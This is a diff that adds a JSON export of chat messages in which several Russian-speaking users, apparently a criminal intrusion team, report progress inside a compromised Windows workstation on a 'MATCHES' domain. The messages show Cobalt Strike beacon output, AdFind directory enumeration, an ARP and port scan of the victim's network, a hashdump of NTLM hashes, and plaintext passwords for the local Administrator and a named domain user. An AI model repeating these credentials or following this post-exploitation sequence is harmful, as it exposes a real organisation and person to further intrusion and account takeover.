@@ -1,0 +1,193 @@
+{
+  "messages": [
+    {
+      "_id": "Tvx5ptNWpA83wkSKN",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-09-22T14:09:32.430Z",
+      "msg": "",
+      "file": {
+        "_id": "JQf4AQC5e8w34PgdN",
+        "name": "user7 - Tue Sep 22 2020 17:09:21 GMT+0300 (Moscow Standard Time).txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "user7 - Tue Sep 22 2020 17:09:21 GMT+0300 (Moscow Standard Time).txt",
+          "title_link": "/file-upload/JQf4AQC5e8w34PgdN/user7%20-%20Tue%20Sep%2022%202020%2017:09:21%20GMT+0300%20(Moscow%20Standard%20Time).txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "Службы"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T14:09:32.466Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "a3NthpygLXMbRKaF7",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : UKHECSLT3028\n   Primary Dns Suffix  . . . . . . . : matches.com\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : matches.com\n                                       Home\n\nEthernet adapter Ethernet:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Intel(R) Ethernet Connection (6) I219-V\n   Physical Address. . . . . . . . . : E8-D8-D1-F3-F7-7E\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n\nWireless LAN adapter Local Area Connection* 1:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Microsoft Wi-Fi Direct Virtual Adapter\n   Physical Address. . . . . . . . . : 60-F2-62-90-AE-62\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n\nWireless LAN adapter Local Area Connection* 2:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Microsoft Wi-Fi Direct Virtual Adapter #2\n   Physical Address. . . . . . . . . : 62-F2-62-90-AE-61\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n\nEthernet adapter Ethernet 2:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Fortinet Virtual Ethernet Adapter (NDIS 6.30)\n   Physical Address. . . . . . . . . : 00-09-0F-FE-00-01\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n\nWireless LAN adapter WiFi:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Intel(R) Wi-Fi 6 AX200 160MHz\n   Physical Address. . . . . . . . . : 3E-5E-B9-EB-F9-F8\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n   IPv6 Address. . . . . . . . . . . : 2a02:c7f:d417:c000:fcae:695d:8216:8644(Preferred) \n   IPv6 Address. . . . . . . . . . . : fda8:e756:3c36:0:fcae:695d:8216:8644(Preferred) \n   Temporary IPv6 Address. . . . . . : 2a02:c7f:d417:c000:848b:70e:a51c:a5c3(Preferred) \n   Temporary IPv6 Address. . . . . . : fda8:e756:3c36:0:6806:3a52:eadd:8175(Preferred) \n   Link-local IPv6 Address . . . . . : fe80::fcae:695d:8216:8644%10(Preferred) \n   IPv4 Address. . . . . . . . . . . : 192.168.0.16(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Lease Obtained. . . . . . . . . . : 21 September 2020 17:20:50\n   Lease Expires . . . . . . . . . . : 23 September 2020 13:55:43\n   Default Gateway . . . . . . . . . : fe80::3e89:94ff:fe6e:1249%10\n                                       192.168.0.1\n   DHCP Server . . . . . . . . . . . : 192.168.0.1\n   DHCPv6 IAID . . . . . . . . . . . : 174125666\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-25-FB-F4-0B-E8-D8-D1-F3-F7-7E\n   DNS Servers . . . . . . . . . . . : fda8:e756:3c36:0:3e89:94ff:fe6e:1248\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n\nEthernet adapter Bluetooth Network Connection:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)\n   Physical Address. . . . . . . . . : 60-F2-62-90-AE-65\n   DHCP Enabled. . . . . . . . . . . : Yes\n   Autoconfiguration Enabled . . . . : Yes\n\nTunnel adapter Teredo Tunneling Pseudo-Interface:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : Microsoft Teredo Tunneling Adapter\n   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   IPv6 Address. . . . . . . . . . . : 2001:0:2851:7ae4:2036:bad:a1f9:8e7c(Preferred) \n   Link-local IPv6 Address . . . . . : fe80::2036:bad:a1f9:8e7c%11(Preferred) \n   Default Gateway . . . . . . . . . : \n   NetBIOS over Tcpip. . . . . . . . : Disabled\n\n```",
+      "ts": "2020-09-22T14:06:23.445Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T14:06:23.821Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GHtrQwPgKxS3gGoWo",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n(ARP) Target '192.168.0.16' is alive. 3E-5E-B9-EB-F9-F8\n(ARP) Target '192.168.0.1' is alive. 3C-89-94-6E-12-49\n(ARP) Target '192.168.0.26' is alive. BC-A5-11-97-4D-A1\n(ARP) Target '192.168.0.12' is alive. (ARP) Target '192.168.0.3' is alive. (ARP) Target '192.168.0.23' is alive. 02(ARP) Target '192.168.0.2' is alive. AC(ARP) Target '192.168.0.4' is alive. (ARP) Target '192.168.0.8' is alive. \n(ARP) Target '192.168.0.6' is alive. B0-68-E6-1D-DC-8F\n(ARP) Target '192.168.0.18' is alive. F0-99-B6-26-91-33\n(ARP) Target '192.168.0.9' is alive. 0C-B2-B7-1C-9C-9B\n(ARP) Target '192.168.0.7' is alive. 02-0F-B5-81-CD-E1\n(ARP) Target '192.168.0.17' is alive. BC-92-6B-7A-D8-BF\n(ARP) Target '192.168.0.10' is alive. (ARP) Target '192.168.0.13' is alive. C098--3801--96A7--6492--6437--DC83\n(ARP) Target '192.168.0.128' is alive. 02-0F-B5-0B-15-44\n192.168.0.10:631\n192.168.0.10:515\n192.168.0.10:443\n192.168.0.10:23\n192.168.0.10:80\n192.168.0.10:21 (220 FTP print service:V-1.13/Use the network password for the ID if updating.)\n192.168.0.7:5000\n192.168.0.7:53\n192.168.0.7:80\n192.168.0.8:80\n192.168.0.16:5040\n192.168.0.16:3389\n192.168.0.16:999\n192.168.0.16:443\n192.168.0.1:5431\n192.168.0.16:139\n192.168.0.16:135\n192.168.0.16:80\n192.168.0.1:5300\n192.168.0.1:443\n192.168.0.1:80\n192.168.0.1:53\n192.168.0.16:445 (platform: 500 version: 10.0 name: UKHECSLT3028 domain: MATCHES)\n```",
+      "ts": "2020-09-22T14:01:30.843Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T14:01:31.194Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "c5pM5S9epJYc6WMrW",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-09-22T13:39:25.196Z",
+      "msg": "",
+      "file": {
+        "_id": "y63rNmoFNd99tcgYa",
+        "name": "seatinfo.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "seatinfo.txt",
+          "title_link": "/file-upload/y63rNmoFNd99tcgYa/seatinfo.txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "от системы"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T13:39:25.226Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AdRkG7bTNGGGw4h7k",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "впн не подключен видимо",
+      "ts": "2020-09-22T13:32:50.957Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T13:32:51.004Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WXdmjEJiTx32bPXgy",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nDomain: UKHECSLT3028\nLogin: Administrator\nPassword: 192837465S!\nNTLM: f490c4823837a7d002e0176f3c5203ad\n\n\nDomain: MATCHES\nLogin: mercedesd\nPassword: Dinham2323\nNTLM: 7c839aa54221edb65e959f18ab9bde41\n```",
+      "ts": "2020-09-22T13:29:52.037Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T13:29:52.123Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "y6NuhcgjPMFw735FP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "`hashdump`\n```\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:f490c4823837a7d002e0176f3c5203ad:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1a20cb05b4b6db77e592dee4e974e4d9:::\n```",
+      "ts": "2020-09-22T13:29:40.187Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T13:29:40.267Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5d5jmawMyb6mYZFtR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "AdFind дохнет на локальном админе, под другими пользователями вообще не отрабатывает \n```\n[*] Tasked beacon to run: C:\\Users\\Administrator\\AdFind.exe -f \"(objectcategory=person)\" > ad_users.txt\n[+] host called home, sent: 108 bytes\n[+] received output:\n\nAdFind V01.49.00.00cpp Joe Richards (joe@joeware.net) February 2015\n\nLDAP_BIND: [] Error 0x51 (81) - Server Down\nTerminating program.\n\n```",
+      "ts": "2020-09-22T13:29:10.321Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T13:29:10.444Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hkWseAzDp2S2xXwta",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-09-22T13:19:05.931Z",
+      "msg": "",
+      "file": {
+        "_id": "BYJuSc4YfeQMWwic3",
+        "name": "winPEAS.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "winPEAS.txt",
+          "title_link": "/file-upload/BYJuSc4YfeQMWwic3/winPEAS.txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "от системы"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T13:19:05.965Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PKeTzfn2BApGkBdWa",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nbeacon> shell net localgroup \"Administrators\"\n[*] Tasked beacon to run: net localgroup \"Administrators\"\n[+] host called home, sent: 62 bytes\n[+] received output:\nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nMATCHES\\domain admins\nMATCHES\\sec_WorkstationLocalAdmin\nThe command completed successfully.\n\n```",
+      "ts": "2020-09-22T12:59:39.211Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-22T12:59:39.307Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
